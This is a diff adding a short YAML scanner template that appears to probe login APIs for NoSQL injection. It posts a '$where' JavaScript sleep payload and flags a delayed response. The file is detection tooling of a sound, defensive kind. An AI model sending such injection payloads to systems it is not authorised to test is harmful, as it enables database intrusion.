@@ -1,0 +1,21 @@
+id: patt-nosql-where-01-login
+name: 'PATT NoSQL patt-nosql-where-01'
+severity: high
+type: active
+tags:
+  - nosql
+  - patt
+  - injection
+  - api
+requires:
+  - node
+description: 'PATT NoSQL $where JS time oracle. [patt:patt-nosql-where-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/README.md]'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"$where": "sleep(3000)"}'
+    sendHeaders:
+      Content-Type: 'application/json'
+    matchers:
+      - type: time
+        ms: 2500
